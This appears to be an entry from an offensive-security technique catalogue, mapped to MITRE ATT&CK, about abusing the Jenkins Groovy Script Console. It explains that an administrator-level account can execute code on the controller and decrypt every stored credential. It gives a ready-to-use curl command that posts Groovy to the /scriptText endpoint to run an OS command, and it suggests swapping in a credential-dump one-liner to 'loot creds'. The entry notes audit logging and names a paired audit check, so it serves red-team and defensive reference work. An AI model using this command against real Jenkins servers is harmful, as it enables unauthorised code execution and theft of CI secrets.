---
id: jenkins-script-console
title: Jenkins Script Console RCE (controller code exec + cred dump)
section: Jenkins / CI/CD
phase: Execution
attack:
  tactic: TA0002
  techniques: [T1059]
platform: [jenkins]
source: Jenkins abuse (Groovy Script Console)
pair: jenkins-script-console-audit
---

The iconic Jenkins move: with **Overall/Administer** (or `RunScripts`), POST Groovy to
the controller's Script Console and get instant code execution *as the Jenkins process* —
run OS commands, and decrypt every stored credential in memory
(`com.cloudbees.plugins.credentials.SystemCredentialsProvider`) in one request. `/script`
is the form, `/scriptText` the API. Both are logged by the Audit Trail plugin. (CI
controller — no on-host target slot.)

```sh
# run Groovy on the controller (RCE; swap in the credentials-dump one-liner to loot creds)
curl -s -u <user>:<api-token> --data-urlencode 'script=println "id".execute().text' \
  "https://<jenkins>/scriptText"
```
